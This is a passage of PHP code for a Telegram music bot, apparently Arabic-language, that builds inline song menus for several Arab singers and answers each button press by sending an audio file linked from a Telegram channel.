if($data=="bika5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/311",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="bika6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/312",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="bika7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/313",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="bika8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/314",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="bika9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/315",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="bika10"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/316",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bika11"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/317",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bika12"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/318",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bika13"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/319",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bika14"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/320",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bika15"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/321",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sabryy" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني رامي صبري 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 خطيره','callback_data'=>"sabryy1"],['text'=>' 🎧 غريب الحب','callback_data'=>"sabryy2"]],
[['text'=>' 🎧 فارق معاك','callback_data'=>"sabryy4"]],
[['text'=>'🎧 قولو الي عندي','callback_data'=>"sabryy5"],['text'=>'🎧 صعبان عليا','callback_data'=>"sabryy6"]],
[['text'=>'🎧 وعجبي عليك يا زمن','callback_data'=>"sabryy7"],['text'=>'🎧 بتاع بنات','callback_data'=>"sabryy8"]],
[['text'=>'🎧 وبقابل ناس','callback_data'=>"sabryy9"],['text'=>'🎧 بتهتمي','callback_data'=>"sabryy10"]],
[['text'=>'🎧 حكايه حينا','callback_data'=>"sabryy11"],['text'=>'🎧 انا بعترفلك','callback_data'=>"sabryy12"]],
[['text'=>'حاول تنساني 🎧','callback_data'=>"sabryy13"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}


if($data=="sabryy1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/430",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sabryy2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/431",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sabryy3"){
$editM =bot( sendaudio ,[
 chat_id =>$chat_id,
 audio =>"https://t.me/mahmoumagdx/432",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sabryy4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/433",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sabryy5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/434",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sabryy6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/435",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sabryy7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/436",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sabryy8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/437",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sabryy9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/438",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sabryy10"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/439",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sabryy11"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/440",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sabryy12"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/441",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sabryy13"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/442",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="amrhos" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني عمار حسني 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'بتيجي ف بالي 🎧','callback_data'=>"amrhos1"],['text'=>'برشامه منوم 🎧','callback_data'=>"amrhos2"]],
[['text'=>'بساط 🎧','callback_data'=>"amrhos3"],['text'=>'طفره 🎧','callback_data'=>"amrhos4"]],
[['text'=>'ترام 🎧','callback_data'=>"amrhos5"],['text'=>'هلوسه 🎧','callback_data'=>"amrhos6"]],
[['text'=>'مسوخ 🎧','callback_data'=>"amrhos7"],['text'=>'اخر عازف 🎧','callback_data'=>"amrhos8"]],
[['text'=>'بلاش تغني 🎧','callback_data'=>"amrhos9"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}
if($data=="amrhos1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/341",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="amrhos2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/342",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="amrhos3"){
$editM =bot( sendaudio ,[
 chat_id =>$chat_id,
 audio =>"https://t.me/mahmoumagdx/343",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="amrhos4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/344",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="amrhos5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/345",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="amrhos6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/346",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="amrhos7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/347",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="amrhos8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/348",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="amrhos9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/349",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="batisto" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني باتيستوتا 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'الفا ميل 🎧','callback_data'=>"batisto1"],['text'=>'الطوفان 🎧','callback_data'=>"batisto2"]],
[['text'=>'المولد 🎧','callback_data'=>"batisto3"],['text'=>'خطر 🎧','callback_data'=>"batisto4"]],
[['text'=>'التراب 🎧','callback_data'=>"batisto5"],['text'=>'باد 🎧','callback_data'=>"batisto6"]],
[['text'=>'مظلات 🎧','callback_data'=>"batisto7"],['text'=>'نيو ويف  🎧','callback_data'=>"batisto8"]],
[['text'=>'ناس 🎧','callback_data'=>"batisto9"],['text'=>'بيره 🎧','callback_data'=>"batisto10"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}
if($data=="batisto1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/538",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="batisto2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/539",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="batisto3"){
$editM =bot( sendaudio ,[
 chat_id =>$chat_id,
 audio =>"https://t.me/mahmoumagdx/540",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="batisto4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/541",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="batisto5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/542",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="batisto6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/543",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="batisto7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/544",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="batisto8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/545",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="batisto9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/546",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="batisto10"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/547",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="wezy" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني ويزي 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'علي العادي 🎧','callback_data'=>"wezy1"],['text'=>'مرجان 🎧','callback_data'=>"wezy2"]],
[['text'=>'كله بالحب 🎧','callback_data'=>"wezy3"],['text'=>'هوم الون 🎧','callback_data'=>"wezy4"]],
[['text'=>'متقدرش توقني🎧','callback_data'=>"wezy5"],['text'=>'بليونير 🎧','callback_data'=>"wezy6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}
if($data=="wezy1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/548",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="wezy2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/549",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="wezy3"){
$editM =bot( sendaudio ,[
 chat_id =>$chat_id,
 audio =>"https://t.me/mahmoumagdx/550",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="wezy4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/551",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="wezy5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/552",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="wezy6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/553",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="wezy7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/554",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sahyn" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني شاهين 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'صوت يجع 🎧','callback_data'=>"sahyn1"],['text'=>'اكسلانس 🎧','callback_data'=>"sahyn2"]],
[['text'=>'الفرنده 🎧','callback_data'=>"sahyn3"],['text'=>'كوم تراب 🎧','callback_data'=>"sahyn4"]],
[['text'=>'ايد هون🎧','callback_data'=>"sahyn5"],['text'=>'اشرس انواع الصقور 🎧','callback_data'=>"sahyn6"]],
[['text'=>'زين 🎧','callback_data'=>"sahyn7"],['text'=>'كل شيت 🎧','callback_data'=>"sahyn8"]],
[['text'=>'جديد نوفي 🎧','callback_data'=>"sahyn9"],['text'=>'حديث مع الانا 🎧','callback_data'=>"sahyn10"]],
[['text'=>'سايفر المعادي🎧','callback_data'=>"sahyn11"],['text'=>'جامد هيك 🎧','callback_data'=>"sahyn12"]],
[['text'=>'لولو  🎧','callback_data'=>"sahyn13"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}

if($data=="sahyn1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/216",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sahyn2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/217",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sahyn3"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/218",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sahyn4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/219",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sahyn5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/220",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sahyn6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/221",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sahyn7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/222",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sahyn8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/223",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sahyn9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/224",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sahyn10"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/225",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="sahyn11"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/226",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sahyn12"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/554",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sahyn13"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/555",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="kaml" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني احمد كامل 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'قولي 🎧','callback_data'=>"kaml1"],['text'=>'مبقتش اخاف 🎧','callback_data'=>"kaml2"]],
[['text'=>'كان في طفل 🎧','callback_data'=>"kaml3"],['text'=>'متزعليش 🎧','callback_data'=>"kaml4"]],
[['text'=>'مش شرط🎧','callback_data'=>"kaml5"],['text'=>'انا رايح 🎧','callback_data'=>"kaml6"]],
[['text'=>'يا ليل 🎧','callback_data'=>"kaml7"],['text'=>'كانسر 🎧','callback_data'=>"kaml8"]],
[['text'=>'زمن المعجزات 🎧','callback_data'=>"kaml9"],['text'=>'جاوبنا 🎧','callback_data'=>"kaml10"]],
[['text'=>'خليك صاحي  🎧','callback_data'=>"kaml11"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}

if($data=="kaml1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/144",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="kaml2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/145",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="kaml3"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/146",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="kaml4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/147",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="kaml5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/148",
 'caption'=>"By : @J_69_L",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="kaml6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/149",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="kaml7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/150",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="kaml8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/151",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="kaml9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/152",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="kaml10"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/153",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="kaml11"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/154",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="gsmy" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني حسين الجسمي 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'اه لقيت الطبطه','callback_data'=>"gsmy1"],['text'=>'الحساس 🎧','callback_data'=>"gsmy2"]],
[['text'=>'خطير 🎧','callback_data'=>"gsmy3"],['text'=>'اهواك للموت 🎧','callback_data'=>"gsmy4"]],
[['text'=>'احبك🎧','callback_data'=>"gsmy5"],['text'=>'فديته 🎧','callback_data'=>"gsmy6"]],
[['text'=>'ابشرك 🎧','callback_data'=>"gsmy7"],['text'=>'شفت 🎧','callback_data'=>"gsmy8"]],
[['text'=>'مهم جدا 🎧','callback_data'=>"gsmy9"],['text'=>'الاسير 🎧','callback_data'=>"gsmy10"]],
[['text'=>'بنعدي 🎧','callback_data'=>"gsmy11"],['text'=>'بطل الحكايه 🎧','callback_data'=>"gsmy12"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}


if($data=="gsmy1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/168",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="gsmy2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/169",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="gsmy3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/170",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="gsmy4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/171",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="gsmy5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/172",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="gsmy6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/173",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="gsmy7"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/174",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="gsmy8"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/175",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="gsmy9"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/176",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="gsmy10"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/177",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="gsmy11"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/178",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="gsmy12"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/179",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="diab" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني عمرو دياب 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'قدام مرايتها 🎧','callback_data'=>"diab1"],['text'=>'تملي معاك 🎧','callback_data'=>"diab2"]],
[['text'=>'يا اجمل عيون 🎧','callback_data'=>"diab3"],['text'=>'وماله 🎧','callback_data'=>"diab4"]],
[['text'=>'هيعيش يفتكرني🎧','callback_data'=>"diab5"],['text'=>'ده لو اتساب 🎧','callback_data'=>"diab6"]],
[['text'=>'اول يوم في البعد 🎧','callback_data'=>"diab7"],['text'=>'معاك قلبي 🎧','callback_data'=>"diab8"]],
[['text'=>'سهران 🎧','callback_data'=>"diab9"],['text'=>'جامده بس 🎧','callback_data'=>"diab10"]],
[['text'=>'حلوه البدايات 🎧','callback_data'=>"diab11"],['text'=>'بالضحكه دي 🎧','callback_data'=>"diab12"]],
[['text'=>'زي مانتي 🎧','callback_data'=>"diab13"],['text'=>'عم الطبيب 🎧','callback_data'=>"diab14"]],
[['text'=>'اماكن السهر 🎧','callback_data'=>"diab15"],['text'=>'اهي اهي 🎧','callback_data'=>"diab16"]],
[['text'=>'حبيت يا قلبي 🎧','callback_data'=>"diab17"],['text'=>'رصيف نمره ٥ 🎧','callback_data'=>"diab18"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}
if($data=="diab1"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/64",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="diab2"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/65",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="diab3"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/66",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="diab4"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/67",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="diab5"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/69",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="diab6"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/70",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="diab7"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/71",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="diab8"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
 audio =>"https://t.me/mahmoumagdx/72",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="diab9"){
$editM =bot( sendaudio ,[
'chat_id'=>$chat_id,
